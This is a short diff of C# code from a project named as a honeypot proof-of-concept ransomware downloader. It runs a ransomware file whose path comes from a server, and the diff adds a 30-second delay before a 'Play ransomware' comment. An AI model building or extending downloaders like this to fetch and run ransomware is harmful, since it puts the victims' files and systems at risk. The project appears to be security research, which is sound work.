@@ -37,7 +37,7 @@ namespace HoneyPot2POCRansomwareDownloader
 
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
 
-
+            Thread.Sleep(30000);
             //Play ransomware
         }
     }
